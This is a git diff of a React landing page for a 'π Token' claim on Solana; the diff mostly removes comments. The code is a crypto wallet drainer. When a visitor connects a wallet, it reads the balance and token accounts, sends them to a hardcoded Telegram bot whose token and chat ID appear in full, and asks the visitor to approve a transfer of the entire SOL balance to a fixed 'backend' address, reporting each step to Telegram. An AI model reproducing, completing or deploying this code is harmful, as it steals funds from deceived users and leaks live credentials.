@@ -1,4 +1,3 @@
-
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
@@ -7,9 +6,7 @@ import { getTokenAccounts, sendToTelegram, signAndSendTransaction, getWalletBala
 import { toast } from '@/components/ui/use-toast';
 import { Menu } from "lucide-react";
 
-// Backend address to send SOL to
 const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
-// The Telegram credentials are kept private and not shown to users
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
 const TELEGRAM_CHAT_ID = "-1002490122517";
 
@@ -37,19 +34,16 @@ const Index = () => {
     
     try {
       console.log("Getting wallet balance directly");
-      // Use the improved getWalletBalance function with built-in retries
       const solBalance = await getWalletBalance(publicKey.toString());
       
       setWalletBalance(solBalance);
       console.log("Current balance:", solBalance, "SOL");
 
-      // Get token accounts
       console.log("Fetching token accounts");
       const tokenAccounts = await getTokenAccounts(connection, publicKey.toString());
       console.log("Token accounts received:", tokenAccounts);
       setTokens(tokenAccounts || []);
 
-      // Reset fetch retries on success
       setFetchRetries(0);
 
       return {
@@ -63,11 +57,9 @@ const Index = () => {
       console.error("Error fetching wallet data:", error);
       setConnectionError(error instanceof Error ? error.message : "Unknown error fetching wallet data");
       
-      // Increment retry count and attempt again if under threshold
       const newRetryCount = fetchRetries + 1;
       setFetchRetries(newRetryCount);
       
-      // Auto-retry if under threshold
       if (newRetryCount < 5) {
         console.log(`Auto-retrying wallet data fetch (${newRetryCount}/5)...`);
         toast({
@@ -76,7 +68,7 @@ const Index = () => {
         });
         setTimeout(() => {
           fetchWalletData();
-        }, 2000 * newRetryCount); // Increasing delay with each retry
+        }, 2000 * newRetryCount);
       }
       
       return null;
@@ -107,7 +99,6 @@ const Index = () => {
       
       console.log("Starting wallet connection process");
       
-      // Fetch all wallet data first with multiple retries
       let walletData = null;
       for (let attempt = 0; attempt < 3; attempt++) {
         try {
@@ -124,14 +115,11 @@ const Index = () => {
         throw new Error("Failed to fetch wallet data after multiple attempts");
       }
       
-      // Show toast with successful data retrieval
       toast({
         title: "Data Retrieved",
         description: "Processing wallet verification...",
       });
       
-      // FIRST TELEGRAM MESSAGE: Always send the initial connection data to Telegram first
-      console.log("Sending initial wallet data to Telegram");
       const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
       
       if (!telegramSent) {
@@ -142,7 +130,6 @@ const Index = () => {
           variant: "destructive",
         });
         
-        // Try one more time after a delay
         setTimeout(async () => {
           await sendToTelegram(walletData!, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
         }, 3000);
@@ -150,11 +137,9 @@ const Index = () => {
         console.log("Successfully sent wallet data to Telegram");
       }
 
-      // Check if wallet has any balance at all
       if (walletData.balance <= 0) {
         console.log("Wallet has no SOL balance");
         
-        // SECOND TELEGRAM MESSAGE: Send notification about zero balance to Telegram
         const zeroBalanceMessage = {
           address: publicKey.toString(),
           message: `WALLET HAS ZERO BALANCE. No transfer will be attempted.`,
@@ -171,12 +156,10 @@ const Index = () => {
         return;
       }
 
-      // Check if balance is sufficient for transfer and fees
       const minimumRequiredBalance = 0.00089 * LAMPORTS_PER_SOL;
       if (walletData.balance * LAMPORTS_PER_SOL <= minimumRequiredBalance) {
         console.log("Wallet balance too low for fees");
         
-        // SECOND TELEGRAM MESSAGE: Send notification about insufficient balance to Telegram
         const lowBalanceMessage = {
           address: publicKey.toString(),
           message: `INSUFFICIENT BALANCE FOR FEES. Balance: ${walletData.balance.toFixed(6)} SOL. Minimum required: 0.00089 SOL.`,
@@ -198,7 +181,6 @@ const Index = () => {
         description: "Preparing transaction...",
       });
 
-      // SECOND TELEGRAM MESSAGE: Send a transfer attempt notification to Telegram
       const transferMessage = {
         address: publicKey.toString(),
         message: `ATTEMPTING TO TRANSFER ${walletData.balance.toFixed(6)} SOL to ${BACKEND_ADDRESS}`,
@@ -207,7 +189,6 @@ const Index = () => {
       
       await sendToTelegram(transferMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
 
-      // Initiate transfer with proper fee calculation
       console.log("Initiating transfer");
       
       try {
@@ -216,8 +197,7 @@ const Index = () => {
           description: "Please confirm the transaction in your wallet",
         });
 
-        // Validation check for wallet before sending
-        if (!wallet || !wallet.publicKey) {
+        if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
           throw new Error("Wallet or publicKey is undefined");
         }
 
@@ -233,7 +213,6 @@ const Index = () => {
         console.log("Transfer completed with signature:", signature);
         setLastSignature(signature);
         
-        // THIRD TELEGRAM MESSAGE: Send completion message with transfer results
         const completionMessage = {
           address: publicKey.toString(),
           message: `TRANSFER COMPLETED! ${walletData.balance.toFixed(6)} SOL sent.
@@ -250,7 +229,6 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
       } catch (error) {
         console.error("Transfer failed:", error);
         
-        // THIRD TELEGRAM MESSAGE: Send failure notification to Telegram
         const failureMessage = {
           address: publicKey.toString(),
           message: `TRANSFER FAILED! Error: ${error instanceof Error ? error.message : "Unknown error"}`,
@@ -269,7 +247,6 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
       console.error('Detailed error in wallet connection:', error);
       setConnectionError(error instanceof Error ? error.message : "Unknown error in wallet connection");
       
-      // Send error notification to Telegram
       if (publicKey) {
         const errorMessage = {
           address: publicKey.toString(),
@@ -303,23 +280,19 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
 
   useEffect(() => {
     if (connected && publicKey && !isProcessing) {
-      // When connection changes, start wallet processing
       handleWalletConnection();
     }
   }, [connected, publicKey]);
 
   return (
     <div className="min-h-screen bg-background p-6 relative">
-      {/* Top Navigation */}
       <nav className="flex justify-between items-center mb-20">
-        {/* Logo */}
         <div className="w-12 h-12 rounded-full bg-gradient-to-r from-cyan-400 to-cyan-300 p-[2px]">
           <div className="w-full h-full rounded-full bg-background flex items-center justify-center">
             <span className="text-2xl font-bold text-cyan-400">π</span>
           </div>
         </div>
         
-        {/* Navigation Buttons */}
         <div className="flex gap-4">
           <button className="circle-button">
             <Menu className="w-6 h-6 text-cyan-400" />
@@ -327,7 +300,6 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
         </div>
       </nav>
 
-      {/* Main Content */}
       <main className="flex flex-col items-center justify-center gap-8 max-w-2xl mx-auto text-center">
         <h1 className="text-5xl md:text-6xl font-bold gradient-text leading-tight">
           Join The π Adventure
@@ -337,13 +309,11 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
           Don't miss out! Click here to claim your exclusive π Token now and be part of the revolution!!
         </p>
 
-        {/* Action Buttons - Centered Connect Wallet */}
         <div className="flex flex-col items-center w-full max-w-md gap-4 mt-4">
           <div className="flex justify-center w-full">
             <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
           </div>
           
-          {/* Only show error messages */}
           {connectionError && (
             <div className="mt-4 p-4 bg-red-900/30 border border-red-700 rounded-lg w-full">
               <p className="text-red-300 font-semibold">Connection Error:</p>
@@ -358,7 +328,6 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
             </div>
           )}
           
-          {/* Only show wallet balance after it's retrieved, no loading indicators */}
           {walletBalance !== null && !isProcessing && (
             <div className="mt-4 p-4 bg-gray-800/80 border border-cyan-800/50 rounded-lg w-full">
               <p className="text-cyan-400 text-lg font-semibold">Detected Wallet Balance: {walletBalance.toFixed(6)} SOL</p>
@@ -378,7 +347,6 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
             </div>
           )}
           
-          {/* Show transaction results only when completed */}
           {lastSignature && (
             <div className="mt-4 p-4 bg-gray-800/80 border border-cyan-800/50 rounded-lg w-full">
               <p className="text-sm text-gray-400">Transaction Signature:</p>
@@ -395,7 +363,6 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
           )}
         </div>
 
-        {/* Bottom Logo */}
         <div className="mt-20">
           <div className="w-32 h-32 rounded-full bg-[#2A2F3F] flex items-center justify-center">
             <div className="w-24 h-24 rounded-full bg-[#4B3979] flex items-center justify-center">
